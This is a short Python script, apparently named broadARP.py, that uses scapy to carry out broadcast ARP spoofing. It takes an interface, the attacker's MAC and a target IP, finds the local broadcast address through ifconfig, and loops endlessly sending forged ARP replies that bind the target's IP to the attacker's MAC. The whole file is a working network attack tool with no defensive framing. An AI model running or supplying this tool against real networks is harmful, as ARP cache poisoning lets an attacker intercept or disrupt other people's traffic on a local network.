from scapy.all import *
from colorama import Fore
import os
import sys

if len(sys.argv) is not 4:
	print(Fore.YELLOW+"[-] Example : python broadARP.py <INTERFACE> <MY MAC> <TARGET IP>"+Fore.RESET)
	sys.exit()

iface2=sys.argv[1]
mymac=sys.argv[2]
targetip=sys.argv[3]

os.system("ifconfig | grep broadcast | awk '{print $6}' > broadip.txt")
f2=open("broadip.txt",'r')
broadip=f2.readline().replace("\r\n",'')
f2.close()
os.system("rm broadip.txt")

ssdpRequest=Ether(dst="ff:ff:ff:ff:ff:ff", type=2054)/ARP(hwdst='00:00:00:00:00:00', pdst=broadip, ptype=2048, hwtype=1, hwlen=6, plen=4, hwsrc=mymac, psrc=targetip, op=2)


print(Fore.YELLOW+"[+] Start : Broadcast ARP SPoofing"+Fore.RESET)
sendp(ssdpRequest, iface=iface2,loop=1, inter=0.5, verbose=1)
print(Fore.YELLOW+"[-] END : Broadcast ARP SPoofing"+Fore.RESET)
